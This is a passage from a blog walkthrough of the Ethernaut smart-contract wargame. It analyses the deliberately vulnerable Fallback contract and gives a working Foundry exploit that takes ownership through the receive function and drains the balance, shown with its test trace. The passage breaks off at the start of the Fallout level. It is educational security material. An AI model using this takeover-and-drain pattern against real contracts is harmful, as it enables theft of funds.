</span></span><span style="display:flex;"><span>    <span style="color:#728e00">function</span> <span style="color:#d35400">contribute</span>() <span style="color:#728e00">public</span> <span style="color:#728e00">payable</span> {
</span></span><span style="display:flex;"><span>        <span style="color:#728e00">require</span>(<span style="color:#728e00">msg</span>.<span style="color:#728e00">value</span> <span style="color:#728e00">&lt;</span> <span style="color:#8a7b52">0</span>.<span style="color:#8a7b52">001</span> <span style="color:#00979d">ether</span>, <span style="color:#7f8c8d">&#34;msg.value must be &lt; 0.001&#34;</span>);
</span></span><span style="display:flex;"><span>        <span style="color:#434f54">contributions</span>[<span style="color:#728e00">msg</span>.<span style="color:#728e00">sender</span>] <span style="color:#728e00">+=</span> <span style="color:#728e00">msg</span>.<span style="color:#728e00">value</span>;
</span></span><span style="display:flex;"><span>        <span style="color:#728e00">if</span> (<span style="color:#434f54">contributions</span>[<span style="color:#728e00">msg</span>.<span style="color:#728e00">sender</span>] <span style="color:#728e00">&gt;</span> <span style="color:#434f54">contributions</span>[<span style="color:#434f54">owner</span>]) {
</span></span><span style="display:flex;"><span>            <span style="color:#434f54">owner</span> <span style="color:#728e00">=</span> <span style="color:#728e00">payable</span>(<span style="color:#728e00">msg</span>.<span style="color:#728e00">sender</span>);
</span></span><span style="display:flex;"><span>        }
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#728e00">function</span> <span style="color:#d35400">getContribution</span>() <span style="color:#728e00">public</span> <span style="color:#728e00">view</span> <span style="color:#728e00">returns</span> (<span style="color:#00979d">uint256</span>) {
</span></span><span style="display:flex;"><span>        <span style="color:#728e00">return</span> <span style="color:#434f54">contributions</span>[<span style="color:#728e00">msg</span>.<span style="color:#728e00">sender</span>];
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#728e00">function</span> <span style="color:#d35400">withdraw</span>() <span style="color:#728e00">public</span> <span style="color:#434f54">onlyOwner</span> {
</span></span><span style="display:flex;"><span>        <span style="color:#434f54">owner</span>.<span style="color:#728e00">transfer</span>(<span style="color:#00979d">address</span>(<span style="color:#728e00">this</span>).<span style="color:#728e00">balance</span>);
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#434f54">receive</span>() <span style="color:#728e00">external</span> <span style="color:#728e00">payable</span> {
</span></span><span style="display:flex;"><span>        <span style="color:#728e00">require</span>(<span style="color:#728e00">msg</span>.<span style="color:#728e00">value</span> <span style="color:#728e00">&gt;</span> <span style="color:#8a7b52">0</span> <span style="color:#728e00">&amp;&amp;</span> <span style="color:#434f54">contributions</span>[<span style="color:#728e00">msg</span>.<span style="color:#728e00">sender</span>] <span style="color:#728e00">&gt;</span> <span style="color:#8a7b52">0</span>);
</span></span><span style="display:flex;"><span>        <span style="color:#434f54">owner</span> <span style="color:#728e00">=</span> <span style="color:#728e00">payable</span>(<span style="color:#728e00">msg</span>.<span style="color:#728e00">sender</span>);
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><p>I&rsquo;ve modified the original level code and removed the <code>SafeMath</code>
usage since we&rsquo;re using <code>solidity ^0.8.2</code>.</p>
  <!--list-separator-->
<ul>
<li>
<p>Analysis</p>
<p>The <code>Fallback</code> contract has the <code>contributions</code> variable of type
<code>mapping(address =&gt; uint256)</code>. In the constructor it sets the
<code>owner</code> variable to a deployer (<code>msg.sender</code>) and records that
the owner donated <code>1000 ether</code>.</p>
<div class="highlight"><pre tabindex="0" style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-solidity" data-lang="solidity"><span style="display:flex;"><span><span style="color:#728e00">constructor</span>() {
</span></span><span style="display:flex;"><span>    <span style="color:#434f54">owner</span> <span style="color:#728e00">=</span> <span style="color:#728e00">payable</span>(<span style="color:#728e00">msg</span>.<span style="color:#728e00">sender</span>);
</span></span><span style="display:flex;"><span>    <span style="color:#434f54">contributions</span>[<span style="color:#728e00">msg</span>.<span style="color:#728e00">sender</span>] <span style="color:#728e00">=</span> <span style="color:#8a7b52">1000</span> <span style="color:#728e00">*</span> (<span style="color:#8a7b52">1</span> <span style="color:#00979d">ether</span>);
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><p>This contract has 3 public functions and a single external
<code>receive</code> function.</p>
<p><strong>getContribution</strong></p>
<div class="highlight"><pre tabindex="0" style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-solidity" data-lang="solidity"><span style="display:flex;"><span><span style="color:#728e00">function</span> <span style="color:#d35400">getContribution</span>() <span style="color:#728e00">public</span> <span style="color:#728e00">view</span> <span style="color:#728e00">returns</span> (<span style="color:#00979d">uint256</span>) {
</span></span><span style="display:flex;"><span>    <span style="color:#728e00">return</span> <span style="color:#434f54">contributions</span>[<span style="color:#728e00">msg</span>.<span style="color:#728e00">sender</span>];
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><p>Nothing interesting, this is just a getter function.</p>
<p><strong>contribute</strong></p>
<div class="highlight"><pre tabindex="0" style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-solidity" data-lang="solidity"><span style="display:flex;"><span><span style="color:#728e00">function</span> <span style="color:#d35400">contribute</span>() <span style="color:#728e00">public</span> <span style="color:#728e00">payable</span> {
</span></span><span style="display:flex;"><span>    <span style="color:#728e00">require</span>(<span style="color:#728e00">msg</span>.<span style="color:#728e00">value</span> <span style="color:#728e00">&lt;</span> <span style="color:#8a7b52">0</span>.<span style="color:#8a7b52">001</span> <span style="color:#00979d">ether</span>, <span style="color:#7f8c8d">&#34;msg.value must be &lt; 0.001&#34;</span>);
</span></span><span style="display:flex;"><span>    <span style="color:#434f54">contributions</span>[<span style="color:#728e00">msg</span>.<span style="color:#728e00">sender</span>] <span style="color:#728e00">+=</span> <span style="color:#728e00">msg</span>.<span style="color:#728e00">value</span>;
</span></span><span style="display:flex;"><span>    <span style="color:#728e00">if</span> (<span style="color:#434f54">contributions</span>[<span style="color:#728e00">msg</span>.<span style="color:#728e00">sender</span>] <span style="color:#728e00">&gt;</span> <span style="color:#434f54">contributions</span>[<span style="color:#434f54">owner</span>]) {
</span></span><span style="display:flex;"><span>        <span style="color:#434f54">owner</span> <span style="color:#728e00">=</span> <span style="color:#728e00">payable</span>(<span style="color:#728e00">msg</span>.<span style="color:#728e00">sender</span>);
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><p>After reading it we can tell that:</p>
<ul>
<li>To become the owner of this contract we need to contribute
more ETH than the previous owner</li>
<li>It is impossible to contribute more than <code>0.001 ETH</code> at once.
Remember the initial donation of the owner (was set in the
<code>constructor</code>)? It is <code>1000 ETH</code>.</li>
</ul>
<p>So in theory this function is vulnerable, but it will take us a lot
of time to exploit. Donating <code>1000 ETH</code> means that we need to
have <code>1000+ ETH</code> on Rinkeby test network and call <code>contribute</code> at
least <code>1000001</code> times.</p>
<p><strong>withdraw</strong></p>
<div class="highlight"><pre tabindex="0" style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-solidity" data-lang="solidity"><span style="display:flex;"><span><span style="color:#728e00">function</span> <span style="color:#d35400">withdraw</span>() <span style="color:#728e00">public</span> <span style="color:#434f54">onlyOwner</span> {
</span></span><span style="display:flex;"><span>    <span style="color:#434f54">owner</span>.<span style="color:#728e00">transfer</span>(<span style="color:#00979d">address</span>(<span style="color:#728e00">this</span>).<span style="color:#728e00">balance</span>);
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><p>This function transfers the contract&rsquo;s balance to the <code>owner</code>.
Notice that the <code>Fallback</code> contract has the <code>onlyOwner</code> modifier
which restricts withdrawals to the <code>owner</code>.</p>
<p><strong>receive</strong></p>
<div class="highlight"><pre tabindex="0" style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-solidity" data-lang="solidity"><span style="display:flex;"><span><span style="color:#434f54">receive</span>() <span style="color:#728e00">external</span> <span style="color:#728e00">payable</span> {
</span></span><span style="display:flex;"><span>    <span style="color:#728e00">require</span>(<span style="color:#728e00">msg</span>.<span style="color:#728e00">value</span> <span style="color:#728e00">&gt;</span> <span style="color:#8a7b52">0</span> <span style="color:#728e00">&amp;&amp;</span> <span style="color:#434f54">contributions</span>[<span style="color:#728e00">msg</span>.<span style="color:#728e00">sender</span>] <span style="color:#728e00">&gt;</span> <span style="color:#8a7b52">0</span>);
</span></span><span style="display:flex;"><span>    <span style="color:#434f54">owner</span> <span style="color:#728e00">=</span> <span style="color:#728e00">payable</span>(<span style="color:#728e00">msg</span>.<span style="color:#728e00">sender</span>);
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><p>This is another function that sets the contract <code>owner</code> but this
one is special. The <code>receive</code> function is used, well, to receive
ETH (when <code>msg.data</code> is empty). It is executed on a call to the
contract with empty calldata (<code>msg.data</code>). Remember the diagram
from the
<a href="https://solidity-by-example.org/sending-ether/"  class="external-link" target="_blank" rel="noopener">solidity-by-example</a>?</p>
 <div class="mermaid">
<p>%%{init: {&rsquo;theme&rsquo;:&rsquo;neutral&rsquo;}}%%
flowchart LR
A[send ETH] &ndash;&gt; B{&ldquo;msg.data is empty?&rdquo;}
B &ndash; yes &ndash;&gt; C{&ldquo;receive() exists?&rdquo;}
C &ndash; yes &ndash;&gt; E[&ldquo;receive()&rdquo;]
C &ndash; no &ndash;&gt; F[&ldquo;fallback()&rdquo;]
B &ndash; no &ndash;&gt; D[&ldquo;fallback()&rdquo;]</p>
 </div>
<p>Reference:
<a href="https://docs.soliditylang.org/en/v0.8.12/contracts.html#receive-ether-function"  class="external-link" target="_blank" rel="noopener">solidity
docs</a></p>
<div class="highlight"><pre tabindex="0" style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-solidity" data-lang="solidity"><span style="display:flex;"><span><span style="color:#728e00">require</span>(<span style="color:#728e00">msg</span>.<span style="color:#728e00">value</span> <span style="color:#728e00">&gt;</span> <span style="color:#8a7b52">0</span> <span style="color:#728e00">&amp;&amp;</span> <span style="color:#434f54">contributions</span>[<span style="color:#728e00">msg</span>.<span style="color:#728e00">sender</span>] <span style="color:#728e00">&gt;</span> <span style="color:#8a7b52">0</span>);
</span></span><span style="display:flex;"><span><span style="color:#434f54">owner</span> <span style="color:#728e00">=</span> <span style="color:#728e00">payable</span>(<span style="color:#728e00">msg</span>.<span style="color:#728e00">sender</span>);
</span></span></code></pre></div><p>The <code>receive</code> function is vulnerable 😈 but to set the <code>owner</code>
we need to contribute something first.</p>
<p>We can come up with the following exploit scenario:</p>
<ol>
<li>Call <code>contribute</code> sending at least <code>0.001 ether</code></li>
<li>Send to the <code>Fallback</code> contract at least <code>1 wei</code> to call the
<code>receive</code> function and change the <code>owner</code></li>
<li>Call <code>withdraw</code> and steal the funds</li>
</ol>
</li>
</ul>
  <!--list-separator-->
<ul>
<li>
<p>Framework</p>
<p>In <a href="https://vyorkin.org/posts/ctf-walkthrough-ethernaut-1-hello" >the previous
post</a> I&rsquo;ve said that I&rsquo;ll copy and adapt levels and their
factories from the
<a href="https://github.com/OpenZeppelin/ethernaut/tree/master/contracts/contracts/levels"  class="external-link" target="_blank" rel="noopener">ethernaut
repository</a> one by one as we progress. Let&rsquo;s do that. This is a
first example of level factory contract:</p>
<div class="highlight"><pre tabindex="0" style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-solidity" data-lang="solidity"><span style="display:flex;"><span><span style="color:#95a5a6">// SPDX-License-Identifier: MIT
</span></span></span><span style="display:flex;"><span><span style="color:#95a5a6"></span><span style="color:#728e00">pragma solidity</span> <span style="color:#728e00">^</span><span style="color:#8a7b52">0</span>.<span style="color:#8a7b52">8</span>.<span style="color:#8a7b52">2</span>;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#728e00">import</span> <span style="color:#7f8c8d">&#34;../../game/LevelFactory.sol&#34;</span>;
</span></span><span style="display:flex;"><span><span style="color:#728e00">import</span> <span style="color:#7f8c8d">&#34;./Fallback.sol&#34;</span>;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#728e00">contract</span> <span style="color:#434f54">FallbackFactory</span> <span style="color:#728e00">is</span> <span style="color:#434f54">LevelFactory</span> {
</span></span><span style="display:flex;"><span>    <span style="color:#728e00">function</span> <span style="color:#d35400">createInstance</span>(<span style="color:#00979d">address</span>)
</span></span><span style="display:flex;"><span>        <span style="color:#728e00">public</span>
</span></span><span style="display:flex;"><span>        <span style="color:#728e00">payable</span>
</span></span><span style="display:flex;"><span>        <span style="color:#728e00">override</span>
</span></span><span style="display:flex;"><span>        <span style="color:#728e00">returns</span> (<span style="color:#00979d">address</span>)
</span></span><span style="display:flex;"><span>    {
</span></span><span style="display:flex;"><span>        <span style="color:#434f54">Fallback</span> <span style="color:#434f54">instance</span> <span style="color:#728e00">=</span> <span style="color:#728e00">new</span> <span style="color:#434f54">Fallback</span>();
</span></span><span style="display:flex;"><span>        <span style="color:#728e00">return</span> <span style="color:#00979d">address</span>(<span style="color:#434f54">instance</span>);
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#728e00">function</span> <span style="color:#d35400">validateInstance</span>(<span style="color:#00979d">address</span> <span style="color:#728e00">payable</span> <span style="color:#434f54">_instance</span>, <span style="color:#00979d">address</span> <span style="color:#434f54">_player</span>)
</span></span><span style="display:flex;"><span>        <span style="color:#728e00">public</span>
</span></span><span style="display:flex;"><span>        <span style="color:#728e00">view</span>
</span></span><span style="display:flex;"><span>        <span style="color:#728e00">override</span>
</span></span><span style="display:flex;"><span>        <span style="color:#728e00">returns</span> (<span style="color:#00979d">bool</span>)
</span></span><span style="display:flex;"><span>    {
</span></span><span style="display:flex;"><span>        <span style="color:#434f54">Fallback</span> <span style="color:#434f54">instance</span> <span style="color:#728e00">=</span> <span style="color:#434f54">Fallback</span>(<span style="color:#434f54">_instance</span>);
</span></span><span style="display:flex;"><span>        <span style="color:#728e00">return</span> <span style="color:#434f54">instance</span>.<span style="color:#434f54">owner</span>() <span style="color:#728e00">==</span> <span style="color:#434f54">_player</span> <span style="color:#728e00">&amp;&amp;</span> <span style="color:#00979d">address</span>(<span style="color:#434f54">instance</span>).<span style="color:#728e00">balance</span> <span style="color:#728e00">==</span> <span style="color:#8a7b52">0</span>;
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><p>It is very similar to the
<a href="https://github.com/OpenZeppelin/ethernaut/blob/master/contracts/contracts/levels/FallbackFactory.sol"  class="external-link" target="_blank" rel="noopener">one
in the Ethernaut repo</a>. I just changed imports, Solidity
version and removed the <code>_player</code> argument name.</p>
</li>
</ul>
  <!--list-separator-->
<ul>
<li>
<p>Exploit</p>
<div class="highlight"><pre tabindex="0" style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-solidity" data-lang="solidity"><span style="display:flex;"><span><span style="color:#95a5a6">// SPDX-License-Identifier: MIT
</span></span></span><span style="display:flex;"><span><span style="color:#95a5a6"></span><span style="color:#728e00">pragma solidity</span> <span style="color:#728e00">^</span><span style="color:#8a7b52">0</span>.<span style="color:#8a7b52">8</span>.<span style="color:#8a7b52">2</span>;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#728e00">import</span> {<span style="color:#434f54">Ethernaut</span>} <span style="color:#728e00">from</span> <span style="color:#7f8c8d">&#34;../game/Ethernaut.sol&#34;</span>;
</span></span><span style="display:flex;"><span><span style="color:#728e00">import</span> {<span style="color:#434f54">Fallback</span>} <span style="color:#728e00">from</span> <span style="color:#7f8c8d">&#34;../levels/Fallback/Fallback.sol&#34;</span>;
</span></span><span style="display:flex;"><span><span style="color:#728e00">import</span> {<span style="color:#434f54">FallbackFactory</span>} <span style="color:#728e00">from</span> <span style="color:#7f8c8d">&#34;../levels/Fallback/FallbackFactory.sol&#34;</span>;
</span></span><span style="display:flex;"><span><span style="color:#728e00">import</span> {<span style="color:#434f54">LevelTest</span>} <span style="color:#728e00">from</span> <span style="color:#7f8c8d">&#34;./common/LevelTest.sol&#34;</span>;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#728e00">contract</span> <span style="color:#434f54">FallbackTest</span> <span style="color:#728e00">is</span> <span style="color:#434f54">LevelTest</span> {
</span></span><span style="display:flex;"><span>  <span style="color:#434f54">Fallback</span> <span style="color:#728e00">private</span> <span style="color:#434f54">level</span>;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>  <span style="color:#728e00">constructor</span>() {
</span></span><span style="display:flex;"><span>    <span style="color:#434f54">levelFactory</span> <span style="color:#728e00">=</span> <span style="color:#728e00">new</span> <span style="color:#434f54">FallbackFactory</span>();
</span></span><span style="display:flex;"><span>  }
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>  <span style="color:#728e00">function</span> <span style="color:#d35400">testFallback</span>() <span style="color:#728e00">public</span> {
</span></span><span style="display:flex;"><span>    <span style="color:#434f54">run</span>();
</span></span><span style="display:flex;"><span>  }
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>  <span style="color:#728e00">function</span> <span style="color:#d35400">init</span>() <span style="color:#728e00">internal</span> <span style="color:#728e00">override</span> {
</span></span><span style="display:flex;"><span>    <span style="color:#434f54">levelAddress</span> <span style="color:#728e00">=</span> <span style="color:#728e00">payable</span>(<span style="color:#728e00">this</span>.<span style="color:#434f54">create</span>());
</span></span><span style="display:flex;"><span>    <span style="color:#434f54">level</span> <span style="color:#728e00">=</span> <span style="color:#434f54">Fallback</span>(<span style="color:#434f54">levelAddress</span>);
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#434f54">assertEq</span>(<span style="color:#434f54">level</span>.<span style="color:#434f54">owner</span>(), <span style="color:#00979d">address</span>(<span style="color:#434f54">levelFactory</span>));
</span></span><span style="display:flex;"><span>  }
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>  <span style="color:#728e00">function</span> <span style="color:#d35400">exploit</span>() <span style="color:#728e00">internal</span> <span style="color:#728e00">override</span> {
</span></span><span style="display:flex;"><span>    <span style="color:#434f54">vm</span>.<span style="color:#434f54">startPrank</span>(<span style="color:#434f54">player</span>);
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#434f54">level</span>.<span style="color:#434f54">contribute</span>{<span style="color:#728e00">value</span><span style="color:#728e00">:</span> <span style="color:#8a7b52">0</span>.<span style="color:#8a7b52">0009</span> <span style="color:#00979d">ether</span>}();
</span></span><span style="display:flex;"><span>    (<span style="color:#00979d">bool</span> <span style="color:#434f54">sent</span>,) <span style="color:#728e00">=</span> <span style="color:#434f54">levelAddress</span>.<span style="color:#728e00">call</span>{<span style="color:#728e00">value</span><span style="color:#728e00">:</span> <span style="color:#8a7b52">1</span>}(<span style="color:#7f8c8d">&#34;&#34;</span>);
</span></span><span style="display:flex;"><span>    <span style="color:#728e00">require</span>(<span style="color:#434f54">sent</span>, <span style="color:#7f8c8d">&#34;Failed to send 1 wei to Fallback contract&#34;</span>);
</span></span><span style="display:flex;"><span>    <span style="color:#434f54">level</span>.<span style="color:#434f54">withdraw</span>();
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#434f54">vm</span>.<span style="color:#434f54">stopPrank</span>();
</span></span><span style="display:flex;"><span>  }
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><p>Let&rsquo;s go over the <code>exploit</code> function:</p>
<ul>
<li>A contribution must be less than <code>0.001 ether</code>, so we donate <code>0.0009 ETH</code>.</li>
<li>Now to call the <code>receive</code> function and to pass the <code>require</code>
precondition we need to sent some ETH. Let&rsquo;s sent just <code>1 wei</code>.</li>
<li>Finally we call the <code>withdraw</code> function to drain contract&rsquo;s balance.</li>
</ul>
 <!--listend-->
<div class="highlight"><pre tabindex="0" style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>$ forge <span style="color:#728e00">test</span> --match-contract FallbackTest -vvvv
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>Running <span style="color:#8a7b52">1</span> <span style="color:#728e00">test</span> <span style="color:#728e00">for</span> src/test/Fallback.t.sol:FallbackTest
</span></span><span style="display:flex;"><span><span style="color:#728e00">[</span>PASS<span style="color:#728e00">]</span> testFallback<span style="color:#728e00">()</span> <span style="color:#728e00">(</span>gas: 402049<span style="color:#728e00">)</span>
</span></span><span style="display:flex;"><span>Traces:
</span></span><span style="display:flex;"><span>  <span style="color:#728e00">[</span>402049<span style="color:#728e00">]</span> FallbackTest::testFallback<span style="color:#728e00">()</span>
</span></span><span style="display:flex;"><span>    ├─ <span style="color:#728e00">[</span>303668<span style="color:#728e00">]</span> FallbackTest::create<span style="color:#728e00">()</span>
</span></span><span style="display:flex;"><span>    │   ├─ <span style="color:#728e00">[</span>0<span style="color:#728e00">]</span> VM::prank<span style="color:#728e00">(</span>player: <span style="color:#728e00">[</span>...<span style="color:#728e00">])</span>
</span></span><span style="display:flex;"><span>    │   │   └─ ← <span style="color:#728e00">()</span>
</span></span><span style="display:flex;"><span>    │   ├─ <span style="color:#728e00">[</span>291320<span style="color:#728e00">]</span> Ethernaut::createLevelInstance<span style="color:#728e00">(</span>FallbackFactory: <span style="color:#728e00">[</span>...<span style="color:#728e00">])</span>
</span></span><span style="display:flex;"><span>    │   │   ├─ <span style="color:#728e00">[</span>239757<span style="color:#728e00">]</span> FallbackFactory::createInstance<span style="color:#728e00">(</span>player: <span style="color:#728e00">[</span>...<span style="color:#728e00">])</span>
</span></span><span style="display:flex;"><span>    │   │   │   ├─ <span style="color:#728e00">[</span>207130<span style="color:#728e00">]</span> → new Fallback@<span style="color:#7f8c8d">&#34;0x037f…dd8f&#34;</span>
</span></span><span style="display:flex;"><span>    │   │   │   │   └─ ← <span style="color:#8a7b52">813</span> bytes of code
</span></span><span style="display:flex;"><span>    │   │   │   └─ ← Fallback: <span style="color:#728e00">[</span>...<span style="color:#728e00">]</span>
</span></span><span style="display:flex;"><span>    │   │   ├─ emit LevelInstanceCreatedLog<span style="color:#728e00">(</span>player: player: <span style="color:#728e00">[</span>...<span style="color:#728e00">]</span>, instance: Fallback: <span style="color:#728e00">[</span>...<span style="color:#728e00">])</span>
</span></span><span style="display:flex;"><span>    │   │   └─ ← Fallback: <span style="color:#728e00">[</span>...<span style="color:#728e00">]</span>
</span></span><span style="display:flex;"><span>    │   └─ ← Fallback: <span style="color:#728e00">[</span>...<span style="color:#728e00">]</span>
</span></span><span style="display:flex;"><span>    ├─ <span style="color:#728e00">[</span>359<span style="color:#728e00">]</span> Fallback::owner<span style="color:#728e00">()</span> <span style="color:#728e00">[</span>staticcall<span style="color:#728e00">]</span>
</span></span><span style="display:flex;"><span>    │   └─ ← FallbackFactory: <span style="color:#728e00">[</span>...<span style="color:#728e00">]</span>
</span></span><span style="display:flex;"><span>    ├─ <span style="color:#728e00">[</span>0<span style="color:#728e00">]</span> VM::startPrank<span style="color:#728e00">(</span>player: <span style="color:#728e00">[</span>...<span style="color:#728e00">])</span>
</span></span><span style="display:flex;"><span>    │   └─ ← <span style="color:#728e00">()</span>
</span></span><span style="display:flex;"><span>    ├─ <span style="color:#728e00">[</span>22923<span style="color:#728e00">]</span> Fallback::contribute<span style="color:#728e00">{</span>value: 900000000000000<span style="color:#728e00">}()</span>
</span></span><span style="display:flex;"><span>    │   └─ ← <span style="color:#728e00">()</span>
</span></span><span style="display:flex;"><span>    ├─ <span style="color:#728e00">[</span>523<span style="color:#728e00">]</span> Fallback::fallback<span style="color:#728e00">{</span>value: 1<span style="color:#728e00">}()</span>
</span></span><span style="display:flex;"><span>    │   └─ ← <span style="color:#728e00">()</span>
</span></span><span style="display:flex;"><span>    ├─ <span style="color:#728e00">[</span>7277<span style="color:#728e00">]</span> Fallback::withdraw<span style="color:#728e00">()</span>
</span></span><span style="display:flex;"><span>    │   ├─ <span style="color:#728e00">[</span>0<span style="color:#728e00">]</span> player::fallback<span style="color:#728e00">{</span>value: 900000000000001<span style="color:#728e00">}()</span>
</span></span><span style="display:flex;"><span>    │   │   └─ ← <span style="color:#728e00">()</span>
</span></span><span style="display:flex;"><span>    │   └─ ← <span style="color:#728e00">()</span>
</span></span><span style="display:flex;"><span>    ├─ <span style="color:#728e00">[</span>0<span style="color:#728e00">]</span> VM::stopPrank<span style="color:#728e00">()</span>
</span></span><span style="display:flex;"><span>    │   └─ ← <span style="color:#728e00">()</span>
</span></span><span style="display:flex;"><span>    ├─ <span style="color:#728e00">[</span>0<span style="color:#728e00">]</span> VM::startPrank<span style="color:#728e00">(</span>player: <span style="color:#728e00">[</span>...<span style="color:#728e00">])</span>
</span></span><span style="display:flex;"><span>    │   └─ ← <span style="color:#728e00">()</span>
</span></span><span style="display:flex;"><span>    ├─ <span style="color:#728e00">[</span>4548<span style="color:#728e00">]</span> Ethernaut::submitLevelInstance<span style="color:#728e00">(</span>Fallback: <span style="color:#728e00">[</span>...<span style="color:#728e00">])</span>
</span></span><span style="display:flex;"><span>    │   ├─ <span style="color:#728e00">[</span>1501<span style="color:#728e00">]</span> FallbackFactory::validateInstance<span style="color:#728e00">(</span>Fallback: <span style="color:#728e00">[</span>...<span style="color:#728e00">]</span>, player: <span style="color:#728e00">[</span>...<span style="color:#728e00">])</span>
</span></span><span style="display:flex;"><span>    │   │   ├─ <span style="color:#728e00">[</span>359<span style="color:#728e00">]</span> Fallback::owner<span style="color:#728e00">()</span> <span style="color:#728e00">[</span>staticcall<span style="color:#728e00">]</span>
</span></span><span style="display:flex;"><span>    │   │   │   └─ ← player: <span style="color:#728e00">[</span>...<span style="color:#728e00">]</span>
</span></span><span style="display:flex;"><span>    │   │   └─ ← <span style="color:#728e00">true</span>
</span></span><span style="display:flex;"><span>    │   ├─ emit LevelCompletedLog<span style="color:#728e00">(</span>player: player: <span style="color:#728e00">[</span>...<span style="color:#728e00">]</span>, level: FallbackFactory: <span style="color:#728e00">[</span>...<span style="color:#728e00">])</span>
</span></span><span style="display:flex;"><span>    │   └─ ← <span style="color:#728e00">true</span>
</span></span><span style="display:flex;"><span>    ├─ <span style="color:#728e00">[</span>0<span style="color:#728e00">]</span> VM::stopPrank<span style="color:#728e00">()</span>
</span></span><span style="display:flex;"><span>    │   └─ ← <span style="color:#728e00">()</span>
</span></span><span style="display:flex;"><span>    └─ ← <span style="color:#728e00">()</span>
</span></span></code></pre></div></li>
</ul>
  <!--list-separator-->
<ul>
<li>
<p>Lessons learned</p>
<p>Anyone can call the <code>receive</code> (or <code>fallback</code>) function so be
careful :P</p>
<p>The full code
<a href="https://github.com/vyorkin/ethernaut-solutions/blob/step-2/src/test/Fallback.t.sol"  class="external-link" target="_blank" rel="noopener">is
here</a>. Thank you for reading and let&rsquo;s move on to the next
challenge: <a href="https://vyorkin.org/posts/ctf-walkthrough-ethernaut-3-fallout" >Ethernaut, #3 Fallout</a>!</p>
</li>
</ul>
</li>
</ul>
<!--list-separator-->
<ul>
<li>
<p><span class="org-todo done DONE">DONE</span>  Ethernaut, #3 Fallout</p>
<p>To complete this level we need to become owner of the contract
below (slightly modified to be compatible with Solidity <code>^0.8.2</code>):</p>
<div class="highlight"><pre tabindex="0" style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-solidity" data-lang="solidity"><span style="display:flex;"><span><span style="color:#95a5a6">// SPDX-License-Identifier: MIT
</span></span></span><span style="display:flex;"><span><span style="color:#95a5a6"></span><span style="color:#728e00">pragma solidity</span> <span style="color:#728e00">^</span><span style="color:#8a7b52">0</span>.<span style="color:#8a7b52">8</span>.<span style="color:#8a7b52">2</span>;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#728e00">import</span> <span style="color:#7f8c8d">&#34;openzeppelin/utils/math/SafeMath.sol&#34;</span>;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#728e00">contract</span> <span style="color:#434f54">Fallout</span> {
</span></span><span style="display:flex;"><span>    <span style="color:#728e00">using</span> <span style="color:#434f54">SafeMath</span> <span style="color:#728e00">for</span> <span style="color:#00979d">uint256</span>;
</span></span><span style="display:flex;"><span>    <span style="color:#728e00">mapping</span>(<span style="color:#00979d">address</span> <span style="color:#728e00">=&gt;</span> <span style="color:#00979d">uint256</span>) <span style="color:#434f54">allocations</span>;
</span></span><span style="display:flex;"><span>    <span style="color:#00979d">address</span> <span style="color:#728e00">payable</span> <span style="color:#728e00">public</span> <span style="color:#434f54">owner</span>;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#95a5a6">/* constructor */</span>
</span></span><span style="display:flex;"><span>    <span style="color:#728e00">function</span> <span style="color:#d35400">Fal1out</span>() <span style="color:#728e00">public</span> <span style="color:#728e00">payable</span> {
</span></span><span style="display:flex;"><span>        <span style="color:#434f54">owner</span> <span style="color:#728e00">=</span> <span style="color:#728e00">payable</span>(<span style="color:#728e00">msg</span>.<span style="color:#728e00">sender</span>);
</span></span><span style="display:flex;"><span>        <span style="color:#434f54">allocations</span>[<span style="color:#434f54">owner</span>] <span style="color:#728e00">=</span> <span style="color:#728e00">msg</span>.<span style="color:#728e00">value</span>;
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>
